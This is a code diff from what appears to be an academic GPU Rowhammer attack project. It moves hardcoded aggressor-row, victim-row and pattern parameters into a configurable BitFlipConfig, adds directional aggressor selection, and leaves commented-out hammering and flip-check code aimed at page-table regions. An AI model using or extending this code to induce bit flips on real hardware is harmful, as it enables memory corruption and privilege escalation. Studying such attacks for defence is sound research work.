@@ -22,6 +22,7 @@ first_PT_region_test (int argc, char *argv[])
   const uint64_t skip = std::stoull (argv[2]);
 
   GPUBreachContext ctx;
+  ctx.bitflip_config = GPUBreachContext::BitFlipConfig(argv[3]);
   if (!alloc_all_mem (num_alloc_init, threshold, skip, ctx))
     {
       printf ("Error: Memory Allocation is wrong\n");
@@ -87,13 +88,14 @@ hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
   auto& agg_vec = ctx.step2_data.agg_vec;
   uint8_t *layout = (uint8_t *)alloc_ptrs[0];
 
-  const uint64_t num_agg = 24;
-  const uint64_t step = 256;
-  const uint64_t min_rowId = 30016 - 94;
-  const uint64_t max_rowId = 30016 + 5;
-  const uint64_t row_step = 4;
-  const uint64_t num_rows = 31000;
-  const uint64_t agg_pat = std::stoull ("0xAA", nullptr, 16);
+  const uint64_t num_agg = ctx.bitflip_config.num_agg;
+  const uint64_t step = ctx.bitflip_config.step;
+  const uint64_t crit_agg = ctx.bitflip_config.crit_agg;
+  const uint64_t vic_row = ctx.bitflip_config.vic_row;
+  const uint64_t row_step = ctx.bitflip_config.row_step;
+  const uint64_t num_rows = ctx.bitflip_config.num_rows;
+  const bool left = ctx.bitflip_config.left;
+  const uint64_t agg_pat = std::stoull (ctx.bitflip_config.agg_pat, nullptr, 16);
 
   const std::string BREACH_ROOT = std::string(std::getenv("BREACH_ROOT"));
 
@@ -102,15 +104,17 @@ hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
       return 1;
   }
   std::ifstream row_set_file (BREACH_ROOT + "/gpuhammer/"
-                              "results/row_sets/ROW_SET_A.txt");
+                              "results/row_sets/" + ctx.bitflip_config.row_set_file);
   RowList rows = read_row_from_file (row_set_file, layout);
   row_set_file.close ();
 
   /* Get Target Aggressors That Trigger the Bit-flip */
+  
   std::vector<uint64_t> target_agg;
   std::vector<uint64_t> all_vics (num_rows);
   std::iota (all_vics.begin (), all_vics.end (), 0);
-  target_agg = get_aggressors (rows, min_rowId, num_agg, row_step);
+  target_agg = get_aggressors_dir (rows, crit_agg, num_agg, row_step, left);
+  std::vector<uint64_t> temp_vec; temp_vec.push_back(vic_row);
 
   // The first page to reserve required for Rowhammer Attack
   uint64_t first_hammer_page
@@ -119,10 +123,9 @@ hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
   // The last page to reserve required for Rowhammer Attack. This case, its the
   // VICTIM page.
   uint64_t last_hammer_page
-      = static_cast<uint64_t> (rows[max_rowId - 5][0] - layout) / ALLOC_SIZE;
-  uint16_t to_reserve
-      = last_hammer_page - first_hammer_page; // Last page excluded.
-
+      = static_cast<uint64_t> (rows[vic_row][0] - layout) / ALLOC_SIZE;
+  uint64_t to_reserve
+      = left ? last_hammer_page - first_hammer_page : (static_cast<uint64_t> (rows[target_agg.back()][0] - layout) / ALLOC_SIZE) - last_hammer_page; // Last page excluded.
   /**
    * Segragate aggressor row pages from the rest, using same insight as Paper
    * Section 4.3 Given our memory is full, freed physical memory is immediately
@@ -146,6 +149,44 @@ hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
 
   agg_row_list = row_agg_pair.first;
   agg_vec = row_agg_pair.second;
+  if (!left)
+    std::reverse(agg_vec.begin(), agg_vec.end());
+
+  // const uint64_t it = ctx.bitflip_config.it;
+  // const uint64_t n = ctx.bitflip_config.n;
+  // const uint64_t k = ctx.bitflip_config.k;
+  // const uint64_t delay = ctx.bitflip_config.delay;
+  // const uint64_t period = ctx.bitflip_config.period;
+  // const uint64_t repeat = ctx.bitflip_config.repeat;
+
+  // set_rows (rows, temp_vec, 0xaa, step);
+  // memset_ptr<<<1,1>>>(alloc_ptrs[last_hammer_page], 0xaaaaaaaaaaaaaaaa, ALLOC_SIZE);
+  // // cudaDeviceSynchronize();
+  // // set_rows (rows, target_agg, agg_pat, step);
+  // // cudaDeviceSynchronize();
+  // evict_L2cache(layout);
+  // cudaDeviceSynchronize();
+  
+
+  // std::reverse(target_agg.begin(), target_agg.end());
+  // std::cout << vector_str(target_agg) << '\n';
+  // for (int j = 0; j < repeat; j++)
+  //   uint64_t time = start_multi_warp_hammer (
+  //       agg_row_list, agg_vec, it, n, k, agg_vec.size (), delay, period);
+  
+  // std::cout << (void*)alloc_ptrs[last_hammer_page] << '\n';
+  // for (int j = 0; j < ALLOC_SIZE; j+=1)
+  // {
+  //   if (*(uint8_t *)(alloc_ptrs[last_hammer_page] + j) != 0x00)
+  //     std::cout << (void*) (alloc_ptrs[last_hammer_page] + j) << ' ' << (void*)*(uint8_t *)(alloc_ptrs[last_hammer_page] + j) << '\n';
+  //   if (*(uint8_t *)(alloc_ptrs[last_hammer_page] + j)== 0xea)
+  //   {
+  //     std::cout << "Flipping still" << '\n';
+  //     break;
+  //   }
+  // }
+  // std::cout << "No Flip?" << '\n';
+  // paused();
 
   return last_hammer_page;
 }
@@ -157,6 +198,7 @@ first_PT_region (int argc, char *argv[])
   const double threshold = std::stod (argv[1]);
   const uint64_t skip = std::stoull (argv[2]);
   GPUBreachContext ctx;
+  ctx.bitflip_config = GPUBreachContext::BitFlipConfig(argv[3]);
 
   return first_PT_region (num_alloc_init, threshold, skip, ctx);
 }
